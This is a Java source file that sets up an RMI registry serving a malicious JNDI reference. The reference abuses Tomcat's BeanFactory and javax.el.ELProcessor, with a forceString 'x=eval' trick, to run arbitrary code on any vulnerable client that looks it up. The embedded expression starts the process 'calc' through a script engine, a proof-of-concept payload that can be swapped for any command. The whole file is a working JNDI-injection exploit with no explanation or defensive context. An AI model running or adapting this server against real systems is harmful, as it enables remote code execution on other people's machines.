import org.apache.naming.ResourceRef;

import javax.naming.InitialContext;
import javax.naming.StringRefAddr;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class Server {
    public static void main(String[] args) throws Exception{
        InitialContext initialContext = new InitialContext();
        Registry registry = LocateRegistry.createRegistry(1099);
        ResourceRef resourceRef = new ResourceRef(
                "javax.el.ELProcessor",
                null,
                "",
                "",
                true,
                "org.apache.naming.factory.BeanFactory",
                null
        );
        resourceRef.add(new StringRefAddr("forceString","x=eval"));
        resourceRef.add(new StringRefAddr("x","\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" + ".newInstance().getEngineByName(\"JavaScript\")" + ".eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['calc']).start()\")"));
        initialContext.rebind("rmi://localhost:1099/remoteObj", resourceRef);
    }
}
